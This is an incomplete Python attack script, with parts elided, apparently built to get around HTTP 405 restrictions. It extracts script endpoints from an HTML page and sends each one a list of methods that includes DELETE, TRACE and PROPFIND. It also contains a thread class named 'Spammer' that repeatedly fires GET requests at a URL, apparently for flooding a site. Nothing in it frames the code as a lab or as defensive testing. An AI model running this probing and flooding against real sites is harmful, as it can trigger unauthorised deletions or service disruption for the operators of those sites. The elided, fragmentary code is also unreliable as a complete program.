...
# Advanced HTTP Methods for 405 Bypass
BYPASS_METHODS = ['OPTIONS', 'HEAD', 'TRACE', 'PATCH', 'DELETE', 'PROPFIND']

# Extract endpoints from HTML content
def extract_endpoints(html_content, base_url):
    endpoints = re.findall(r'src="(.*?)"', html_content)
    return [urllib.parse.urljoin(base_url, ep) for ep in endpoints]

# Perform 405 Bypass
def bypass_405(endpoint):
    print(f"\n[INFO] Testing endpoint: {endpoint}")
    for method in BYPASS_METHODS:
        try:
            response = requests.request(method, endpoint, timeout=5, allow_redirects=False)
...
class Spammer(threading.Thread):
    ...
    def request(self):
        ...
        try:
            req = requests.get(self.url, headers=self.headers, timeout=5)
            print(f"[GET] {self.url} | Status: {req.status_code}")
        except Exception as e:
...
class MainLoop:
    ...
    def setup(self):
        ...
        <script type="text/javascript" src="/vendor.async.buffer~7e5e8261.chunk.js"></script>
        <script type="text/javascript" src="/vendor.async.eventsource~05185d12.chunk.js"></script>
        </head></html>
        '''

        endpoints = extract_endpoints(html_content, url)  # Extract endpoints from HTML
        print("[INFO] Extracted Endpoints:")
        for ep in endpoints:
            print(ep)
            bypass_405(ep)  # Perform 405 Bypass on extracted endpoints
